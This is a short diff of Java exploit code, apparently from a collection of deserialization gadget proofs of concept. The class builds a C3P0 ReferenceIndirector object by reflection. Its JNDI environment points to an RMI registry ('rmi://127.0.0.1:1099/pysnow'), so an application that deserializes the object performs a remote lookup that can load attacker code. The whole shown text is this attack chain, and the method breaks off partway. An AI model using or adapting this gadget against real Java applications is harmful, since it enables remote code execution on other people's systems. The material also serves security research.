@@ -2,24 +2,20 @@ package C3P0;
 
 import com.mchange.v2.c3p0.impl.JndiRefDataSourceBase;
 import com.mchange.v2.naming.ReferenceIndirector;
-import com.mchange.v2.ser.Indirector;
-import com.mchange.v2.ser.SerializableUtils;
 
-import javax.naming.Name;
 import javax.naming.Reference;
 import java.io.*;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.util.Hashtable;
 
-public class c3p0_jndi_readobject {
+public class c3p0_jndi_readobject_rmi {
     public static void main(String[] args) throws Exception {
         Reference ref = new Reference(null);
 
         Hashtable env = new Hashtable();
         env.put("java.naming.factory.initial","com.sun.jndi.rmi.registry.RegistryContextFactory");
         env.put("java.naming.provider.url","rmi://127.0.0.1:1099/pysnow");
-
         Constructor<?> refconz = ReferenceIndirector.class.getDeclaredClasses()[0].getDeclaredConstructors()[0];
         refconz.setAccessible(true);
         Object refser = refconz.newInstance(ref, null, null, env);
